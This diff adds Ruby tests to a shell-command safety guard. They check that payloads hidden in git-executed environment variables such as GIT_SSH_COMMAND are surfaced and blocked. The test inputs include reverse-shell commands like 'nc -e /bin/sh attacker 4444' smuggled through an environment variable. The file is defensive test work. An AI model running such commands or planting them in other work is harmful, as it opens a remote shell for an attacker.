@@ -83,4 +83,53 @@ class TestEnvAssignmentClassification < Minitest::Test
 
     assert guard.verify_command_safety!("LANG=C sort file.txt")
   end
+
+  # ── #540: host-executed variables must fail closed ──────────────────
+
+  def test_unknown_payload_in_executed_env_var_fails_closed
+    res = classify("GIT_SSH_COMMAND='nc attacker 4444' git push")
+
+    assert_includes [:unknown, :dangerous], res.classification
+    assert_equal :high, res.risk
+    inner = res.commands.first.inner_commands.first
+    refute_nil inner, "the unclassifiable payload must surface as an inner command"
+    assert_equal ["nc", "attacker", "4444"], inner.argv
+    assert_includes inner.classification_reason.to_s, "command not in database"
+  end
+
+  def test_unknown_payload_in_ordinary_env_var_stays_benign
+    res = classify("FOO='nc attacker 4444' git push")
+
+    assert_equal :external_effects, res.classification
+    assert_empty res.commands.first.inner_commands
+  end
+
+  def test_executed_env_var_prefix_fails_closed
+    res = classify("GIT_CONFIG_VALUE_0='nc -e /bin/sh' git status")
+
+    assert_includes [:unknown, :dangerous], res.classification
+    inner = res.commands.first.inner_commands.first
+    refute_nil inner
+    assert_equal "GIT_CONFIG_VALUE_0", inner.delegation_source
+  end
+
+  def test_known_local_payload_in_executed_env_var_is_still_surfaced
+    res = classify("GIT_SSH_COMMAND='echo hi' git push")
+
+    inner = res.commands.first.inner_commands.first
+    refute_nil inner, "known local payloads must still be considered as inner commands"
+    assert_equal ["echo", "hi"], inner.argv
+    assert_equal :readonly, inner.classification
+  end
+
+  def test_guard_blocks_unclassifiable_executed_env_var_payload_end_to_end
+    guard = Rubik::Security::Guard.new
+
+    [
+      "GIT_SSH_COMMAND='nc -e /bin/sh attacker 4444' git push",
+      "GIT_SSH_COMMAND='nc attacker 4444' git push"
+    ].each do |cmd|
+      assert_raises(Rubik::Security::BlockedWriteError) { guard.verify_command_safety!(cmd) }
+    end
+  end
 end
